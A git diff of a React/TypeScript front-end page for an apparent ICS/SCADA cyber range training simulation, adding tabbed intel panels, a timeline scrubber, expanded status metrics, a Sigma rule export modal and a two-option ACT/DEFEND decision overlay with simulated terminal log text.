-                SECTION 04 — THREAT DIAGNOSTICS & SIEM DETECTIONS
+                SECTION 04 — EXPLAINABLE AI & THREAT DIAGNOSTICS
               </p>
               <h3 className="display text-3xl sm:text-4xl lg:text-5xl mt-2">
-                Explainable AI & Live Threat Feed
+                Explainable AI Event Telemetry
               </h3>
             </div>
             <span className="mono-label text-xs text-foreground/60">PURDUE MODEL LEVEL 0–3</span>
           </div>
 
-          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div className="lg:col-span-2 space-y-6">
-              <ExplainableAIPanel
-                sector={sector}
-                activeEvent={
-                  activeIdx >= 0
-                    ? {
-                        eventId: `evt-${activeIdx}`,
-                        timestamp: EVENTS[activeIdx].t,
-                        type: "TELEMETRY_ANOMALY" as const,
-                        sourceAssetId: EVENTS[activeIdx].node,
-                        targetAssetId: EVENTS[activeIdx].node,
-                        severity:
-                          EVENTS[activeIdx].sev === "MEDIUM"
-                            ? "WARN"
-                            : (EVENTS[activeIdx].sev as "INFO" | "WARN" | "HIGH" | "CRITICAL"),
-                        title: EVENTS[activeIdx].title,
-                        description: EVENTS[activeIdx].desc,
-                        data: {},
-                      }
-                    : null
-                }
-              />
-              <SigmaRuleExport
-                sector={sector}
-                unmitigatedEvents={EVENTS.slice(0, Math.max(1, activeIdx + 1)).map((ev) => ({
-                  nodeId: ev.node,
-                  nodeLabel: NODES.find((n) => n.id === ev.node)?.label || ev.node,
-                  tactic: ev.tag,
-                  mitreId: "T0855",
-                  vendor: "Siemens SCADA",
-                }))}
-              />
+          <div className="w-full">
+            <ExplainableAIPanel
+              sector={sector}
+              activeEvent={
+                activeIdx >= 0
+                  ? {
+                      eventId: `evt-${activeIdx}`,
+                      timestamp: EVENTS[activeIdx].t,
+                      type: "TELEMETRY_ANOMALY" as const,
+                      sourceAssetId: EVENTS[activeIdx].node,
+                      targetAssetId: EVENTS[activeIdx].node,
+                      severity:
+                        EVENTS[activeIdx].sev === "MEDIUM"
+                          ? "WARN"
+                          : (EVENTS[activeIdx].sev as "INFO" | "WARN" | "HIGH" | "CRITICAL"),
+                      title: EVENTS[activeIdx].title,
+                      description: EVENTS[activeIdx].desc,
+                      data: {},
+                    }
+                  : null
+              }
+            />
+          </div>
+
+          {/* CYBER RANGE INTEL & PROTOCOL INSPECTOR TOOLKIT */}
+          <div className="w-full border border-rule bg-card/30 p-5 space-y-4 font-mono text-xs">
+            <div className="flex flex-wrap items-center justify-between border-b border-rule pb-3 gap-3">
+              <div className="flex items-center gap-2">
+                <span className="text-accent font-bold text-xs uppercase tracking-widest">
+                  CYBER RANGE INTEL & PROTOCOL INSPECTOR TOOLKIT
+                </span>
+                <span className="text-foreground/40 text-[10px]">|</span>
+                <span className="text-foreground/60 text-[10px]">
+                  TARGET SECTOR: {sector.toUpperCase()}
+                </span>
+              </div>
+
+              {/* Tab Selector Toolbar */}
+              <div className="flex items-center gap-2">
+                <button
+                  type="button"
+                  onClick={() => setIntelTab("packets")}
+                  className={`px-3 py-1 text-[10px] font-bold border transition-colors cursor-pointer ${
+                    intelTab === "packets"
+                      ? "bg-accent text-accent-foreground border-accent"
+                      : "bg-background text-foreground/70 border-rule hover:border-accent"
+                  }`}
+                >
+                  [PACKET INSPECTOR]
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setIntelTab("guidance")}
+                  className={`px-3 py-1 text-[10px] font-bold border transition-colors cursor-pointer ${
+                    intelTab === "guidance"
+                      ? "bg-accent text-accent-foreground border-accent"
+                      : "bg-background text-foreground/70 border-rule hover:border-accent"
+                  }`}
+                >
+                  [KILL CHAIN & PURDUE GUIDANCE]
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setIntelTab("cve")}
+                  className={`px-3 py-1 text-[10px] font-bold border transition-colors cursor-pointer ${
+                    intelTab === "cve"
+                      ? "bg-accent text-accent-foreground border-accent"
+                      : "bg-background text-foreground/70 border-rule hover:border-accent"
+                  }`}
+                >
+                  [CVE & CISA INTEL]
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setIntelTab("anatomy")}
+                  className={`px-3 py-1 text-[10px] font-bold border transition-colors cursor-pointer ${
+                    intelTab === "anatomy"
+                      ? "bg-accent text-accent-foreground border-accent"
+                      : "bg-background text-foreground/70 border-rule hover:border-accent"
+                  }`}
+                >
+                  [ATTACK ANATOMY & 3 SURFACES]
+                </button>
+              </div>
             </div>
-            <div className="lg:col-span-1">
-              <CISAThreatFeed activeSector={sector} />
-            </div>
+
+            {/* Tab 1: Live SCADA Protocol Packet Inspector */}
+            {intelTab === "packets" && (
+              <div className="animate-fade-in space-y-2">
+                <div className="flex justify-between items-center text-[10px] text-foreground/50 mb-1">
+                  <span>LIVE INDUSTRIAL PROTOCOL CAPTURE STREAM</span>
+                  <span>MODBUS-TCP / DNP3 / IEC-104 PROTOCOL DECODER</span>
+                </div>
+                <PacketInspector event={activeIdx >= 0 ? EVENTS[activeIdx] : null} t={t} />
+              </div>
+            )}
+
+            {/* Tab 2: Purdue Model & Kill Chain Phase Guidance */}
+            {intelTab === "guidance" && (
+              <div className="animate-fade-in space-y-2">
+                <PhaseGuidancePanel
+                  sector={sector}
+                  role="BLUE"
+                  currentPhase="CONTAINMENT"
+                  eventTagsSeen={activeEvents.map((e) => e.tag)}
+                  onRunCommand={(cmd) => {
+                    setTerminalOpen(true);
+                    setTerminalInput(cmd);
+                    const fakeForm = {
+                      preventDefault: () => {},
+                    } as React.FormEvent<HTMLFormElement>;
+                    setTimeout(() => handleTerminalSubmit(fakeForm), 50);
+                  }}
+                />
+              </div>
+            )}
+
+            {/* Tab 3: CVE & CISA Sector Intelligence */}
+            {intelTab === "cve" && (
+              <div className="animate-fade-in space-y-2">
+                <CVEIntelPanel
+                  nodeId={
+                    selected || (activeIdx >= 0 ? EVENTS[activeIdx].node : NODES[0]?.id || "plc-3")
+                  }
+                  nodeLabel={
+                    selected || (activeIdx >= 0 ? EVENTS[activeIdx].node.toUpperCase() : "PLC-3")
+                  }
+                  onClose={() => setSelected(null)}
+                />
+              </div>
+            )}
+
+            {/* Tab 4: Attack Anatomy & 3 Attack Surfaces Reference */}
+            {intelTab === "anatomy" && (
+              <div className="animate-fade-in space-y-2">
+                <AttackAnatomyPanel
+                  sector={sector}
+                  adversary={exercise.adversary}
+                  protocol={exercise.protocols}
+                />
+              </div>
+            )}
           </div>
         </div>
       </section>
 
       {/* SECTION 05 — OUTCOME — branches with operator choices */}
-      <section className="relative border-b border-rule overflow-hidden">
+      <section data-reveal className="relative border-b border-rule overflow-hidden">
         <img
           src={facility}
           alt=""
@@ -2667,6 +3444,7 @@ function SimulationPage() {
         compromisedCount={compromisedNodes.size}
         isolatedCount={isolatedNodes.size}
         patchedCount={patchedNodes.size}
+        nodes={NODES}
       />
 
       {/* ASSET DOSSIER MODAL OVERLAY */}
@@ -2722,11 +3500,99 @@ function SimulationPage() {
         <DecisionOverlay
           decision={activeDecision}
           onChoose={(choiceId) => {
-            setChoices((prev) => ({ ...prev, [activeDecision.id]: choiceId }));
+            const decId = activeDecision.id;
+            setChoices((prev) => ({ ...prev, [decId]: choiceId }));
+            if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
+
+            // Target node associated with active decision event
+            const ev = EVENTS.find((e) => e.t === activeDecision.t);
+            const targetId = ev ? ev.node : NODES[3]?.id || "plc-3";
+            const targetLabel =
+              NODES.find((n) => n.id === targetId)?.label || targetId.toUpperCase();
+
+            // Auto-execute CLI logs and containment actions
+            if (choiceId === "ACT") {
+              setTerminalLogs((logs) => [
+                ...logs,
+                `┌──(kali㏌twinsec)-[~/cyber-range]`,
+                `└─$ decide ${decId} ACT`,
+                `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> ACT`,
+                `[+] MANUAL OVERRIDE ISSUED: Setpoint overrides deployed to ${targetLabel}.`,
+                `[*] Real-time physics telemetry & live dashboard metrics recalculated automatically.`,
+              ]);
+              setShareToast(
+                `⚡ DECISION EXECUTED: ACT - Setpoint Override Issued to ${targetLabel}`,
+              );
+            } else {
+              // DEFEND option
+              setPatchedNodes((prev) => new Set([...Array.from(prev), targetId]));
+              setIsolatedNodes((prev) => new Set([...Array.from(prev), targetId]));
+              setTerminalLogs((logs) => [
+                ...logs,
+                `┌──(kali㏌twinsec)-[~/cyber-range]`,
+                `└─$ decide ${decId} DEFEND`,
+                `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> DEFEND`,
+                `[+] DEFENSE ENFORCED: Cryptographic patch & air-gap isolation applied to ${targetLabel}.`,
+                `[*] Downstream adversary cascade severed. Simulation clock resumed.`,
+              ]);
+              setShareToast(`[DEFENSE]: ${targetLabel} PATCHED & AIR-GAPPED`);
+            }
+
             setActiveDecision(null);
+            setPlaying(true); // Keep physics and live dashboard running continuously
           }}
-          onDismiss={() => setActiveDecision(null)}
         />
+      )}
+
+      {/* SIMULATION AUTH GATE MODAL */}
+      <SimulationAuthGate
+        isOpen={authGateOpen}
+        sector={sector}
+        onLoginSuccess={() => setAuthGateOpen(false)}
+        onRegisterSuccess={() => setAuthGateOpen(false)}
+        onContinueAsGuest={() => setAuthGateOpen(false)}
+      />
+
+      {/* PRE-SIMULATION MISSION BRIEFING OVERLAY MODAL */}
+      {briefingOpen && (
+        <MissionBriefing
+          scenario={currentScenario}
+          isModal
+          onClose={() => setBriefingOpen(false)}
+          onStartSimulation={() => {
+            setBriefingOpen(false);
+            setPlaying(true);
+          }}
+        />
+      )}
+
+      {/* SIEM SIGMA DETECTION RULE EXPORT MODAL */}
+      {showSigmaModal && (
+        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
+          <div className="bg-[#090c10] border border-accent p-5 max-w-2xl w-full max-h-[85vh] overflow-y-auto font-mono text-xs space-y-4 shadow-2xl">
+            <div className="flex justify-between items-center border-b border-rule pb-2">
+              <span className="text-accent font-bold uppercase tracking-wider text-sm">
+                PRODUCTION SIEM SIGMA DETECTION RULE
+              </span>
+              <button
+                onClick={() => setShowSigmaModal(false)}
+                className="text-danger hover:bg-danger/20 border border-danger/40 px-2 py-0.5 font-bold cursor-pointer"
+              >
+                [CLOSE]
+              </button>
+            </div>
+            <SigmaRuleExport
+              sector={sector}
+              unmitigatedEvents={EVENTS.map((e) => ({
+                nodeId: e.node,
+                nodeLabel: e.node.toUpperCase(),
+                tactic: e.tag,
+                mitreId: "T0855",
+                vendor: "Siemens S7 / Modbus RTU",
+              }))}
+            />
+          </div>
+        </div>
       )}
     </main>
   );
@@ -2796,6 +3662,170 @@ function computeOutcome(choices: Record<string, ChoiceId>) {
 }
 
 /* ------------------------------------------------------------------ */
+/*  TRANSPORT (Sticky Scrubber & Playback Controls)                   */
+/* ------------------------------------------------------------------ */
+
+function Transport({
+  t,
+  setT,
+  playing,
+  setPlaying,
+  speed,
+  setSpeed,
+  displaySpeed,
+  activeIdx,
+  choices,
+  events,
+  decisions,
+  total,
+  onStep,
+  onReset,
+}: {
+  t: number;
+  setT: (n: number) => void;
+  playing: boolean;
+  setPlaying: (b: boolean) => void;
+  speed: number;
+  setSpeed: (n: number) => void;
+  displaySpeed: number;
+  activeIdx: number;
+  choices: Record<string, ChoiceId>;
+  events: Event[];
+  decisions: Decision[];
+  total: number;
+  onStep?: () => void;
+  onReset?: () => void;
+}) {
+  const pct = total > 0 ? (t / total) * 100 : 0;
+  return (
+    <section
+      className="border-b border-rule bg-card/85 sticky top-0 z-30 backdrop-blur-md"
+      style={{ paddingTop: "env(safe-area-inset-top)" }}
+    >
+      <div className="mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 py-3 sm:py-3.5 flex flex-wrap items-center gap-3 sm:gap-6">
+        <div className="flex items-center gap-2">
+          <button
+            type="button"
+            onClick={() => setPlaying(!playing)}
+            className="size-10 sm:size-11 bg-accent text-accent-foreground font-bold text-sm sm:text-base flex items-center justify-center hover:bg-foreground hover:text-background transition-colors cursor-pointer"
+            aria-label={playing ? "Pause" : "Play"}
+          >
+            {playing ? "❚❚" : "▶"}
+          </button>
+          {onStep && (
+            <button
+              type="button"
+              onClick={onStep}
+              className="size-10 sm:size-11 border border-rule mono-label text-xs hover:border-accent hover:text-accent transition-colors flex items-center justify-center cursor-pointer"
+              title="Step forward (+5s or next event)"
+            >
+              ⏭
+            </button>
+          )}
+          {onReset && (
+            <button
+              type="button"
+              onClick={onReset}
+              className="size-10 sm:size-11 border border-rule mono-label text-xs hover:border-accent hover:text-accent transition-colors flex items-center justify-center cursor-pointer"
+              title="Restart timeline to T+00:00"
+            >
+              ↺
+            </button>
+          )}
+        </div>
+
+        <div className="mono-label tabular-nums text-xs">
+          T+{fmt(t)} <span className="text-foreground/40">/ {fmt(total)}</span>
+        </div>
+
+        <div className="order-last sm:order-none flex-1 basis-full sm:basis-auto min-w-[200px] relative h-10 flex items-center">
+          {/* progress track + filled segment */}
+          <div className="absolute inset-x-0 top-1/2 -translate-y-1/2 h-[3px] bg-rule" />
+          <div
+            className="absolute top-1/2 -translate-y-1/2 h-[3px] bg-accent transition-[width] duration-100"
+            style={{ left: 0, width: `${pct}%` }}
+          />
+          {/* event markers — sync log + topology when clicked */}
+          {events.map((e, i) => (
+            <button
+              key={i}
+              type="button"
+              onClick={() => setT(e.t + 0.1)}
+              title={`T+${fmt(e.t)} · ${e.tag}: ${e.title}`}
+              className="absolute -translate-x-1/2 group z-10 cursor-pointer"
+              style={{ left: `${total > 0 ? (e.t / total) * 100 : 0}%` }}
+            >
+              <span
+                className={`block size-2.5 sm:size-3 ${
+                  i <= activeIdx ? sevColor(e.sev) : "bg-rule"
+                } group-hover:scale-150 transition-transform`}
+              />
+              {i === activeIdx && (
+                <span className="absolute -top-4 left-1/2 -translate-x-1/2 mono-label text-[9px] text-accent whitespace-nowrap">
+                  ▼
+                </span>
+              )}
+            </button>
+          ))}
+          {/* decision markers above track */}
+          {decisions.map((d) => (
+            <span
+              key={d.id}
+              className="absolute -translate-x-1/2 -bottom-1 z-10 pointer-events-none"
+              style={{ left: `${total > 0 ? (d.t / total) * 100 : 0}%` }}
+              title={d.question}
+            >
+              <span
+                className={`block w-0 h-0 border-x-[4px] border-x-transparent border-t-[6px] ${
+                  choices[d.id] ? "border-t-accent" : "border-t-foreground/60"
+                }`}
+              />
+            </span>
+          ))}
+          <input
+            type="range"
+            min={0}
+            max={total}
+            step={1}
+            value={Math.round(t)}
+            onChange={(e) => setT(Number(e.target.value))}
+            className="absolute inset-0 w-full opacity-0 cursor-pointer z-20"
+            aria-label="Scrub timeline"
+          />
+          <div
+            className="absolute -translate-x-1/2 pointer-events-none flex flex-col items-center top-0 bottom-0"
+            style={{ left: `${pct}%` }}
+          >
+            <span className="block w-px h-full bg-accent" />
+          </div>
+        </div>
+
+        <div className="flex items-center gap-1.5 mono-label text-xs">
+          <span className="hidden sm:inline text-foreground/50 text-[10px]">SPEED:</span>
+          {[1, 15, 60, 240, 600, 1000].map((s) => {
+            const active = Math.abs(speed - s) < 2;
+            return (
+              <button
+                key={s}
+                type="button"
+                onClick={() => setSpeed(s)}
+                className={`px-2 py-1 border tabular-nums transition-colors cursor-pointer text-[10px] sm:text-xs ${
+                  active
+                    ? "bg-accent text-accent-foreground border-accent font-bold"
+                    : "border-rule hover:border-accent hover:text-accent bg-card/20"
+                }`}
+              >
+                {s}×
+              </button>
+            );
+          })}
+        </div>
+      </div>
+    </section>
+  );
+}
+
+/* ------------------------------------------------------------------ */
 /*  CHROME                                                            */
 /* ------------------------------------------------------------------ */
 
@@ -2804,34 +3834,82 @@ function StatusBar({
   playing,
   compromised,
   speed,
+  live,
+  halt,
+  adversary = "UNIT-414",
+  mlState = "NOMINAL",
+  mlScore = 0.05,
 }: {
   t: number;
   playing: boolean;
   compromised: number;
   speed: number;
+  live?: { mttd: string; mttr: string; shed: string; cost: string };
+  halt?: { node: string; reason: string } | null;
+  adversary?: string;
+  mlState?: string;
+  mlScore?: number;
 }) {
   return (
     <div className="border-b border-rule bg-paper text-ink">
-      <div className="mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 py-3 grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 mono-label !text-ink/70 gap-2 sm:gap-3">
+      <div className="mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 py-3 grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 mono-label !text-ink/70 gap-2 sm:gap-3">
         <span className="truncate">
-          STATE · <span className="text-ink">{playing ? "RUNNING" : "HOLD"}</span>
+          STATE ·{" "}
+          <span className="text-ink font-bold">
+            {halt ? "HALTED" : playing ? "RUNNING" : "HOLD"}
+          </span>
         </span>
         <span className="truncate">
-          CLOCK · <span className="text-ink tabular-nums">T+{fmt(t)}</span>
+          CLOCK · <span className="text-ink tabular-nums font-bold">T+{fmt(t)}</span>
         </span>
         <span className="truncate">
           NODES ·{" "}
-          <span className="text-ink tabular-nums">
+          <span className="text-ink tabular-nums font-bold">
             {compromised} / {NODES.length}
           </span>
         </span>
         <span className="truncate hidden sm:inline">
           SPEED · <span className="text-ink tabular-nums">{Math.round(speed)}×</span>
         </span>
+        <span className="truncate hidden md:inline">
+          ML ·{" "}
+          <span
+            className={
+              mlState === "NOMINAL" ? "text-ink font-bold" : "text-danger font-bold animate-pulse"
+            }
+          >
+            {mlState} ({Math.round(mlScore * 100)}%)
+          </span>
+        </span>
         <span className="truncate hidden md:inline text-right">
-          ADVERSARY · <span className="text-ink">UNIT-414</span>
+          ADVERSARY · <span className="text-ink font-bold">{adversary}</span>
         </span>
       </div>
+      {live && (
+        <div className="mx-auto max-w-[1600px] px-5 sm:px-6 lg:px-10 pb-3 grid grid-cols-2 md:grid-cols-4 mono-label !text-ink/70 gap-2 sm:gap-3 border-t border-ink/10 pt-3">
+          <span className="truncate">
+            MTTD · <span className="text-ink tabular-nums font-bold">{live.mttd}</span>
+          </span>
+          <span className="truncate">
+            MTTR · <span className="text-ink tabular-nums font-bold">{live.mttr}</span>
+          </span>
+          <span className="truncate">
+            SHED · <span className="text-ink tabular-nums font-bold">{live.shed}</span>
+          </span>
+          <span className="truncate">
+            IMPACT · <span className="text-ink tabular-nums font-bold">{live.cost}</span>
+          </span>
+        </div>
+      )}
+      {halt && (
+        <div
+          role="alert"
+          className="bg-danger text-background px-5 sm:px-6 lg:px-10 py-2 mono-label font-bold text-xs"
+        >
+          !! PROPAGATION HALTED → {halt.node.toUpperCase()} · {halt.reason} · use `restore{" "}
+          {halt.node}` or click node to release
+        </div>
+      )}
     </div>
   );
 }
@@ -2866,236 +3944,6 @@ function ImpactTick() {
         }
       `}</style>
     </div>
-  );
-}
-
-/* ------------------------------------------------------------------ */
-/*  TOPOLOGY                                                          */
-/* ------------------------------------------------------------------ */
-
-function Topology({
-  compromised,
-  selected,
-  onSelect,
-  t,
-  activeNode,
-}: {
-  compromised: Set<string>;
-  selected: string | null;
-  onSelect: (id: string, source?: "tap" | "long") => void;
-  t: number;
-  activeNode: string | null;
-}) {
-  const byId = (id: string) => NODES.find((n) => n.id === id)!;
-  const [pressed, setPressed] = useState<string | null>(null);
-  const longTimer = useRef<number | null>(null);
-  const firedLong = useRef(false);
-
-  const onPointerDown = (id: string) => {
-    setPressed(id);
-    firedLong.current = false;
-    if (longTimer.current) window.clearTimeout(longTimer.current);
-    longTimer.current = window.setTimeout(() => {
-      firedLong.current = true;
-      onSelect(id, "long");
-      setPressed(null);
-    }, 420);
-  };
-  const onPointerUp = (id: string) => {
-    if (longTimer.current) window.clearTimeout(longTimer.current);
-    longTimer.current = null;
-    if (!firedLong.current) onSelect(id, "tap");
-    setPressed(null);
-  };
-  const onPointerCancel = () => {
-    if (longTimer.current) window.clearTimeout(longTimer.current);
-    longTimer.current = null;
-    setPressed(null);
-  };
-
-  return (
-    <svg
-      viewBox="0 0 100 100"
-      preserveAspectRatio="none"
-      className="absolute inset-0 h-full w-full touch-manipulation"
-    >
-      {EDGES.map((e, i) => {
-        const a = byId(e.from);
-        const b = byId(e.to);
-        const live = compromised.has(e.from) && compromised.has(e.to);
-        return (
-          <g key={i}>
-            <line
-              x1={a.x}
-              y1={a.y}
-              x2={b.x}
-              y2={b.y}
-              stroke={live ? "oklch(0.86 0.24 125)" : "oklch(0.35 0.01 240)"}
-              strokeWidth={live ? 0.35 : 0.15}
-              vectorEffect="non-scaling-stroke"
-            />
-            {live && (
-              <line
-                x1={a.x}
-                y1={a.y}
-                x2={b.x}
-                y2={b.y}
-                stroke="oklch(0.97 0.005 90)"
-                strokeWidth={0.6}
-                strokeDasharray="0.8 3"
-                strokeDashoffset={-t * 4}
-                vectorEffect="non-scaling-stroke"
-                opacity={0.6}
-              />
-            )}
-          </g>
-        );
-      })}
-      {NODES.map((n) => {
-        const isC = compromised.has(n.id);
-        const isS = selected === n.id;
-        const isA = activeNode === n.id;
-        const isP = pressed === n.id;
-        return (
-          <g
-            key={n.id}
-            className="cursor-pointer select-none focus:outline-none [&:focus-visible>rect.focus-ring]:opacity-100"
-            style={{ touchAction: "manipulation" }}
-            role="button"
-            tabIndex={0}
-            aria-label={`${n.label} — ${n.kind}. ${isC ? "Compromised" : "Nominal"}. Ring ${n.ring}. Press Enter or Space to open asset dossier.`}
-            aria-pressed={isS}
-            onPointerDown={(e) => {
-              e.preventDefault();
-              onPointerDown(n.id);
-            }}
-            onPointerUp={() => onPointerUp(n.id)}
-            onPointerLeave={onPointerCancel}
-            onPointerCancel={onPointerCancel}
-            onKeyDown={(e) => {
-              if (e.key === "Enter" || e.key === " ") {
-                e.preventDefault();
-                onSelect(n.id, "tap");
-              }
-            }}
-          >
-            {/* Safe-area-aware enlarged hit target (invisible) */}
-            <rect x={n.x - 5} y={n.y - 5} width={10} height={10} fill="transparent" />
-            {/* Keyboard focus ring (shown only on :focus-visible via parent selector) */}
-            <rect
-              className="focus-ring"
-              x={n.x - 3}
-              y={n.y - 3}
-              width={6}
-              height={6}
-              fill="none"
-              stroke="oklch(0.97 0.005 90)"
-              strokeWidth={0.45}
-              strokeDasharray="0.8 0.6"
-              vectorEffect="non-scaling-stroke"
-              opacity={0}
-              style={{ transition: "opacity 120ms" }}
-            />
-            {/* Haptic-style press ripple */}
-            {isP && (
-              <circle
-                cx={n.x}
-                cy={n.y}
-                r={2}
-                fill="none"
-                stroke="oklch(0.97 0.005 90)"
-                strokeWidth={0.4}
-                vectorEffect="non-scaling-stroke"
-                opacity={0.9}
-              >
-                <animate attributeName="r" from="1.5" to="7" dur="0.42s" repeatCount="indefinite" />
-                <animate
-                  attributeName="opacity"
-                  from="1"
-                  to="0"
-                  dur="0.42s"
-                  repeatCount="indefinite"
-                />
-              </circle>
-            )}
-            {isA && (
-              <circle
-                cx={n.x}
-                cy={n.y}
-                r={4.5}
-                fill="none"
-                stroke="oklch(0.97 0.005 90)"
-                strokeWidth={0.25}
-                vectorEffect="non-scaling-stroke"
-                opacity={0.9}
-              >
-                <animate attributeName="r" from="2" to="6" dur="1.2s" repeatCount="indefinite" />
-                <animate
-                  attributeName="opacity"
-                  from="0.9"
-                  to="0"
-                  dur="1.2s"
-                  repeatCount="indefinite"
-                />
-              </circle>
-            )}
-            {isC && (
-              <circle
-                cx={n.x}
-                cy={n.y}
-                r={3}
-                fill="none"
-                stroke="oklch(0.86 0.24 125)"
-                strokeWidth={0.2}
-                opacity={0.4}
-                vectorEffect="non-scaling-stroke"
-              />
-            )}
-            <rect
-              x={n.x - 1.4}
-              y={n.y - 1.4}
-              width={2.8}
-              height={2.8}
-              fill={isC ? "oklch(0.86 0.24 125)" : "oklch(0.14 0.005 240)"}
-              stroke={
-                isS ? "oklch(0.97 0.005 90)" : isC ? "oklch(0.97 0.005 90)" : "oklch(0.55 0.02 240)"
-              }
-              strokeWidth={isS ? 0.5 : 0.2}
-              vectorEffect="non-scaling-stroke"
-              style={{
-                transition: "transform 120ms",
-                transformOrigin: `${n.x}px ${n.y}px`,
-                transform: isP ? "scale(1.25)" : undefined,
-              }}
-            />
-          </g>
-        );
-      })}
-
-      {NODES.map((n) => (
-        <g key={n.id + "-l"}>
-          <text
-            x={n.x + 2.2}
-            y={n.y - 1.6}
-            fill="oklch(0.97 0.005 90)"
-            fontSize="1.6"
-            fontFamily="JetBrains Mono, monospace"
-            opacity={selected === n.id || compromised.has(n.id) ? 1 : 0.55}
-          >
-            {n.label}
-          </text>
-          <text
-            x={n.x + 2.2}
-            y={n.y + 0.4}
-            fill="oklch(0.65 0.02 240)"
-            fontSize="1.1"
-            fontFamily="JetBrains Mono, monospace"
-          >
-            {n.kind.toUpperCase()}
-          </text>
-        </g>
-      ))}
-    </svg>
   );
 }
 
@@ -3253,6 +4101,13 @@ function NodeOverlay({
             ) : (
               <ol className="mt-4 space-y-3">
                 {events.map((e, i) => {
+                  const evTime =
+                    typeof e.t === "number" && !isNaN(e.t)
+                      ? e.t
+                      : typeof (e as unknown as { time?: number }).time === "number" &&
+                          !isNaN((e as unknown as { time?: number }).time!)
+                        ? (e as unknown as { time?: number }).time!
+                        : 0;
                   const isBlockedEvent =
                     e.status === "BLOCKED_AIRGAP" ||
                     e.status === "PREVENTED_UPSTREAM" ||
@@ -3261,11 +4116,11 @@ function NodeOverlay({
                   return (
                     <li key={i}>
                       <button
-                        onClick={() => onJump(e.t)}
+                        onClick={() => onJump(evTime)}
                         className="w-full text-left grid grid-cols-[4.5rem_auto_minmax(0,1fr)_auto] gap-3 items-center border border-rule p-3 hover:border-accent hover:bg-accent/5 transition-colors group"
                       >
                         <span className="font-mono text-xs text-foreground/60 group-hover:text-accent">
-                          T+{fmt(e.t)}
+                          T+{fmt(evTime)}
                         </span>
                         <span
                           className={`size-2.5 ${
@@ -3321,7 +4176,7 @@ function NodeOverlay({
                   : "bg-muted/80 text-foreground border border-rule hover:border-emerald-400 hover:text-emerald-400 font-bold"
               }`}
             >
-              {isPatched ? "REVERT PATCH ↩" : "DEPLOY FIRMWARE PATCH 🛡️"}
+              {isPatched ? "REVERT PATCH ↩" : "DEPLOY FIRMWARE PATCH [PATCH]"}
             </button>
           )}
           {onToggleIsolate && (
@@ -3349,25 +4204,24 @@ function NodeOverlay({
 function DecisionOverlay({
   decision,
   onChoose,
-  onDismiss,
 }: {
   decision: Decision;
   onChoose: (id: ChoiceId) => void;
-  onDismiss: () => void;
 }) {
+  // Only present 2 options: ACT vs DEFEND
+  const activeOptions = decision.options.slice(0, 2);
+
   return (
     <div className="fixed inset-0 z-50 flex items-stretch sm:items-center justify-center bg-ink/80 backdrop-blur-sm p-0 sm:p-6 animate-fade-in">
       <div className="relative w-full max-w-3xl bg-paper text-ink border border-ink shadow-2xl flex flex-col max-h-screen sm:max-h-[90vh] overflow-auto">
         <div className="border-b border-ink/20 p-5 sm:p-8">
           <div className="flex flex-wrap items-baseline justify-between gap-3">
-            <p className="mono-label !text-ink/60">OPERATOR DECISION · T+{fmt(decision.t)}</p>
-            <button
-              onClick={onDismiss}
-              className="mono-label !text-ink/60 hover:!text-ink"
-              aria-label="Dismiss"
-            >
-              SKIP ✕
-            </button>
+            <p className="mono-label !text-ink/60">
+              OPERATOR DECISION REQUIRED · T+{fmt(decision.t)}
+            </p>
+            <span className="mono-label px-2 py-0.5 bg-accent text-accent-foreground text-[10px]">
+              ACT vs DEFEND
+            </span>
           </div>
           <p className="font-serif text-2xl sm:text-4xl italic mt-3 leading-[1.05]">
             {decision.question}
@@ -3377,14 +4231,16 @@ function DecisionOverlay({
           </p>
         </div>
 
-        <div className="grid grid-cols-1 sm:grid-cols-3">
-          {decision.options.map((o) => (
+        <div className="grid grid-cols-1 sm:grid-cols-2">
+          {activeOptions.map((o) => (
             <button
               key={o.id}
               onClick={() => onChoose(o.id)}
-              className="text-left p-5 sm:p-6 border-t sm:border-t-0 sm:border-l first:sm:border-l-0 border-ink/20 hover:bg-ink hover:text-paper transition-colors group"
+              className="text-left p-6 border-t sm:border-t-0 sm:border-l first:sm:border-l-0 border-ink/20 hover:bg-ink hover:text-paper transition-colors group cursor-pointer"
             >
-              <p className="mono-label">{o.id}</p>
+              <p className="mono-label font-bold text-accent">
+                {o.id === "ACT" ? "[ACT] OPERATIONAL OVERRIDE" : "[DEFEND] AIR-GAP & ATTESTATION"}
+              </p>
               <p className="display text-2xl sm:text-3xl mt-2 leading-none">{o.label}</p>
               <p className="font-serif text-sm sm:text-base italic mt-4 leading-snug opacity-80 group-hover:opacity-100">
                 → {o.consequence}
